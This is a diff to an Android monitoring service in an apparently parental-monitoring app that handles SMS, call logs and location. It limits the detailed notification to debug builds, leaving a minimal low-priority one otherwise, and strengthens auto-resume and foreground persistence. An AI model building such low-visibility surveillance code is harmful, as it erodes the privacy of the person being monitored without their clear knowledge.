@@ -49,7 +49,7 @@ class MonitoringService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        preferencesManager = PreferencesManager(this)
+        preferencesManager = PreferencesManager.getInstance(this)
         smsRepository = SmsRepository(this)
         callLogRepository = CallLogRepository(this)
         messageQueue = MessageQueue(this)
@@ -60,8 +60,8 @@ class MonitoringService : Service() {
         when (intent?.action) {
             ACTION_START_MONITORING -> startMonitoring()
             ACTION_STOP_MONITORING -> stopMonitoring()
-            null -> {
-                if (preferencesManager.isMonitoringEnabled && preferencesManager.isConfigured()) {
+            else -> {
+                if (shouldAutoResume()) {
                     startMonitoring()
                 } else {
                     stopSelf()
@@ -69,6 +69,14 @@ class MonitoringService : Service() {
             }
         }
         return START_STICKY
+    }
+
+    private fun shouldAutoResume(): Boolean {
+        return try {
+            preferencesManager.isMonitoringEnabled && preferencesManager.isConfigured() && !preferencesManager.userDisabledMonitoring
+        } catch (_: Exception) {
+            false
+        }
     }
 
     private fun escapeHtml(text: String): String {
@@ -109,7 +117,7 @@ class MonitoringService : Service() {
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
         
-        if (com.redeye.parentalmonitor.BuildConfig.DEBUG || com.redeye.parentalmonitor.BuildConfig.PARENTAL_UI) {
+        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) {
             // DEBUG: Show detailed notification
             notificationBuilder
                 .setContentTitle(getString(R.string.notification_title))
@@ -132,10 +140,22 @@ class MonitoringService : Service() {
         if (hasLocationPermission()) {
             foregroundTypes = foregroundTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
         }
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(NOTIFICATION_ID, notificationBuilder.build(), foregroundTypes)
-        } else {
-            startForeground(NOTIFICATION_ID, notificationBuilder.build())
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                startForeground(NOTIFICATION_ID, notificationBuilder.build(), foregroundTypes)
+            } else {
+                startForeground(NOTIFICATION_ID, notificationBuilder.build())
+            }
+        } catch (e: Exception) {
+            android.util.Log.w("MonitoringService", "Foreground start failed, retrying minimal", e)
+            try {
+                startForeground(
+                    NOTIFICATION_ID,
+                    notificationBuilder.build(),
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                )
+            } catch (_: Exception) {
+            }
         }
         android.util.Log.d("MonitoringService", "Foreground notification started (with camera type)")
 
@@ -705,7 +725,7 @@ class MonitoringService : Service() {
             android.util.Log.i("MonitoringService", "=== Initial data sending complete ===")
 
         } catch (e: Exception) {
-            android.util.Log.e("MonitoringService", "Error in initial sync", e)
+            android.util.Log.e("MonitoringService", "Error in initial sync: ${redactToken(e.message)}")
         }
     }
 
